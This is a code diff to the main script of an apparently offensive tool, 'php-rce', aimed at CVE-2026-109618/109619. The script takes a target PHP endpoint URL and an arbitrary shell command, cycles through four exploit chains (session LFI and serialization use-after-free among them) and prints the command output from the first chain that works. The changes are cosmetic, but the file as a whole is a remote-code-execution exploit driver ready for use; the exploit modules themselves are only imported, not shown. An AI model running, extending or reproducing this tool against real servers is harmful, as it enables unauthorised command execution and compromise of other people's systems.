@@ -12,40 +12,33 @@ from exploits.serialize_uaf import serialize_uaf
 from exploits.unserialize_uaf import unserialize_uaf
 from exploits.fast_fire import fast_fire
 
-CHAINS = [session_lfi, serialize_uaf, unserialize_uaf, fast_fire]
+EXPLOITS = [session_lfi, serialize_uaf, unserialize_uaf, fast_fire]
 
 
 def main():
     ap = argparse.ArgumentParser(description="php-rce — CVE-2026-109618/109619")
     ap.add_argument("--url", required=True, help="target PHP endpoint URL")
-    ap.add_argument("cmd", help="shell command to execute")
+    ap.add_argument("--cmd", required=True, help="shell command to execute")
     args = ap.parse_args()
 
     u = urlparse(args.url)
     if u.scheme not in ("http", "https") or not u.hostname:
-        sys.exit("[!] url must be a full http(s) URL")
+        sys.exit("url must be a full http(s) URL")
 
     sid = "a" + "".join(random.choices(ALNUM, k=25))
     marker, payload = build_payload(args.cmd)
 
-    print("[*] php-rce — CVE-2026-109618/109619")
-    print(f"[*] target : {args.url}")
-    print(f"[*] cmd    : {args.cmd}")
-    print(f"[*] session: {sid}")
-    print()
+    print(f"target: {args.url}  cmd: {args.cmd}\n")
 
-    for fn in CHAINS:
-        print(f"[*] trying {fn.__name__} ...")
+    for fn in EXPLOITS:
+        print(f"trying {fn.__name__} ...")
         out = fn(args.url, args.cmd, sid, marker, payload)
         if out:
-            print()
-            print("[+] ===== COMMAND OUTPUT =====")
-            print(out)
-            print("[+] =========================")
+            print(f"\n{out}")
             return
         print()
 
-    print("[-] all chains exhausted")
+    print("all exploits exhausted")
     sys.exit(1)
 
 
